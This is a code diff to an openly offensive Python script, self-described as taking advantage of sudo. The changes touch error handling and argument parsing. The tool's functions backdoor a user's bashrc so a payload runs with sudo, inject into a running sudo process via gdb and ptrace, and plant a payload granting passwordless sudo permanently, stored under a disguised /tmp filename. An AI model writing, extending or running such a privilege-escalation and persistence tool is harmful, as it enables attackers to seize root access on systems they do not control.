@@ -83,12 +83,16 @@ def backdoor_rc(payload, sudofile):
 
 def check_bin(bin):
     """Check if `bin` is in PATH and executable."""
-    return which(bin) is not None
+    result = which(bin)
+    if result is None:
+        print("The program {} could not be found in your file path").format(bin)
+        print("You may want to update your path if you know it to exist")
+    return result is not None
 
 
 def inject(payload,pid,sudofile):
     if not check_bin('gdb'):
-       print("error")
+       sys.exit()
     
     if not ptrace_check():
         sys.exit() 
@@ -110,19 +114,16 @@ def inject(payload,pid,sudofile):
 
 
 def main(args):
-    # inject or backdoor, one or the other - currently 
-    if not args.i:
-        args.b = True
     
     if not os.path.isfile(args.payload):
         gen_break_ticket_payload(args.payload)
-    
     
     # backdoor the rc file of the current user so the next 
     # time they run sudo 
     if args.b:  
         backdoor_rc(args.payload,args.f)
-
+    
+    # backdoor the rc file of the current user so the next 
     if args.i:
         inject(args.payload,args.p,args.f)
  
@@ -130,8 +131,9 @@ def main(args):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='A script to take advantage of Sudo')
-    parser.add_argument('-b', action="store_true", default=False, help="backdoor bashrc to launch payload as sudo next time")
-    parser.add_argument('-i', action="store_true", default=False, help="try to inject into a running sudo process and run a privileged command")
+    group = parser.add_mutually_exclusive_group(required=True)
+    group.add_argument('-b', action="store_true", default=False, help="backdoor bashrc to launch payload as sudo next time")
+    group.add_argument('-i', action="store_true", default=False, help="try to inject into a running sudo process and run a privileged command")
     parser.add_argument('-d', action="store_true", default=False, help="payload that will allow you to sudo with no passwd in any terminal forever")
     parser.add_argument('-p', action="store", default=None, help="pid that ran sudo - to be used with -i, otherwise will bruteforce shells")
     parser.add_argument('--payload', action="store", default='/tmp/Temp-49733d70-30fb-9402-0b0c187a1eba', help="location of payload on disk to run")
